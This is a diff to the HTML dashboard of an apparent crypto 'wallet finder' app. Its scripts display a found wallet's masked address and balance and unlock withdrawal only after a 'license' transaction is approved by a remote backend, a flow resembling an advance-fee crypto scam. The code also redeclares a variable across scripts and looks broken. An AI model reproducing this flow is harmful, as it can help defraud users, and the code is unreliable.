@@ -95,21 +95,45 @@
     </button>
 </div>
 
-  
+  <script>
+    function goToTransaction() {
+      window.location.href = "transaction.html";
+    }
+
+    const username = localStorage.getItem("username") || "Unknown";
+    const wallet = JSON.parse(localStorage.getItem("found_wallet") || "{}");
+    const license = localStorage.getItem("license_status") || "not submitted";
+    const hash = localStorage.getItem("license_tx") || "N/A";
+
+    const maskedAddress = wallet.address ? wallet.address.substring(0, 6) + "••••••••" + wallet.address.slice(-4) : "N/A";
+
+    document.getElementById("username").textContent = username;
+    document.getElementById("walletAddress").textContent = maskedAddress;
+    document.getElementById("walletBalance").textContent = wallet.balance || "N/A";
+    document.getElementById("walletNetwork").textContent = wallet.network || "N/A";
+    document.getElementById("licenseStatus").textContent = license;
+    document.getElementById("licenseTx").textContent = hash;
+
+    if (license.toLowerCase() === "approved") {
+      document.getElementById("withdrawBtn").disabled = false;
+    }
+  </script>
 
 <script>
-  let storedUsername = localStorage.getItem("username");
-  const usernameSpan = document.getElementById("username");
-  if (usernameSpan) usernameSpan.innerText = storedUsername;
+  const usernameElement = document.getElementById("username");
+  const goBtn = document.getElementById("goTransaction");
 
-  fetch(`https://dolphinwalletfinderbackend-production.up.railway.app/api/status/${storedUsername}`)
+  const username = localStorage.getItem("username");
+  if (usernameElement) usernameElement.innerText = username;
+
+  fetch(`https://dolphinwalletfinderbackend-production.up.railway.app/api/status/${username}`)
     .then(res => res.json())
     .then(data => {
-      const btn = document.getElementById("goTransaction");
-      if (btn && data.status === "approved") {
-        btn.disabled = false;
+      if (data.status === "approved" && goBtn) {
+        goBtn.disabled = false;
       }
-    });
+    })
+    .catch(console.error);
 </script>
 
 </body>
